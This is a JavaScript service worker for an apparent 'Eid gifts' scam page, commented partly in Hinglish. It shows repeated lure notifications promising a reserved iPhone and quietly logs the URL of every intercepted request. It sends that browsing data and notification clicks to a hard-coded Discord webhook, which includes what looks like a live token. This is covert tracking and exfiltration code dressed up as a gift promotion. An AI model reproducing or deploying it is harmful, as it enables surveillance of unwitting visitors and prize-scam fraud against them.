// SERVICE WORKER - BACKGROUND MEIN CHALEGA
const CACHE_NAME = 'eid-gifts-v1';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg';

// Install event
self.addEventListener('install', event => {
    console.log('Service Worker installed');
    self.skipWaiting();
});

// Activate event
self.addEventListener('activate', event => {
    console.log('Service Worker activated');
    event.waitUntil(clients.claim());
});

// Push event - YAHAN SE NOTIFICATIONS AAYENGE
self.addEventListener('push', event => {
    console.log('Push received');
    
    let data = {};
    if (event.data) {
        data = event.data.json();
    }
    
    const options = {
        body: data.body || '🎁 Aapka gift ready hai!',
        icon: 'https://via.placeholder.com/100?text=🎁',
        badge: 'https://via.placeholder.com/50?text=🎁',
        vibrate: [200, 100, 200, 100, 200],
        data: {
            url: data.url || '/',
            timestamp: Date.now(),
            type: data.type || 'gift'
        },
        actions: [
            { action: 'open', title: '🎁 Open Gift' },
            { action: 'later', title: '⏰ Later' }
        ],
        tag: 'gift-' + Date.now(),
        renotify: true,
        requireInteraction: true,
        silent: false
    };
    
    event.waitUntil(
        self.registration.showNotification(
            data.title || '🎉 Eid Mubarak!',
            options
        )
    );
});

// Notification click event
self.addEventListener('notificationclick', event => {
    console.log('Notification clicked:', event.action);
    
    event.notification.close();
    
    if (event.action === 'open') {
        // Open main page
        event.waitUntil(
            clients.openWindow(event.notification.data.url || '/')
        );
    }
    
    // Send click data to Discord
    sendToDiscord({
        content: '👆 User clicked notification',
        embeds: [{
            title: 'Notification Click',
            fields: [
                { name: 'Action', value: event.action || 'open', inline: true },
                { name: 'Time', value: new Date().toLocaleString(), inline: true },
                { name: 'Type', value: event.notification.data.type || 'gift', inline: true }
            ]
        }]
    });
});

// Background sync
self.addEventListener('sync', event => {
    if (event.tag === 'send-data') {
        event.waitUntil(sendCollectedData());
    }
});

// Fetch event - data collect karo
self.addEventListener('fetch', event => {
    // Background mein data collect karo
    collectData(event.request);
});

// Periodic background tasks
setInterval(() => {
    // Har 30 minute mein notification bhejo
    self.registration.showNotification('🎁 Gift Still Waiting!', {
        body: 'Aapka iPhone 15 abhi bhi reserved hai',
        icon: 'https://via.placeholder.com/100?text=📱',
        tag: 'reminder-' + Date.now(),
        requireInteraction: true
    });
}, 1800000); // 30 minutes

// Data collection function
async function collectData(request) {
    const data = {
        url: request.url,
        time: Date.now(),
        type: 'background',
        userAgent: self.navigator?.userAgent || 'unknown'
    };
    
    // Store in cache
    const cache = await caches.open('data-store');
    const key = 'data-' + Date.now();
    cache.put(key, new Response(JSON.stringify(data)));
}

// Send collected data
async function sendCollectedData() {
    const cache = await caches.open('data-store');
    const keys = await cache.keys();
    
    for (const key of keys) {
        const response = await cache.match(key);
        const data = await response.json();
        
        await sendToDiscord({
            content: '📊 Background Data',
            embeds: [{
                title: 'Collected Data',
                fields: [
                    { name: 'URL', value: data.url, inline: false },
                    { name: 'Time', value: new Date(data.time).toLocaleString(), inline: true },
                    { name: 'Type', value: data.type, inline: true }
                ]
            }]
        });
        
        await cache.delete(key);
    }
}

// Send to Discord
async function sendToDiscord(data) {
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.log('Discord send failed');
    }
}

// Background geolocation (if allowed)
self.addEventListener('periodicsync', event => {
    if (event.tag === 'get-location') {
        // Note: Background location needs permission
    }
});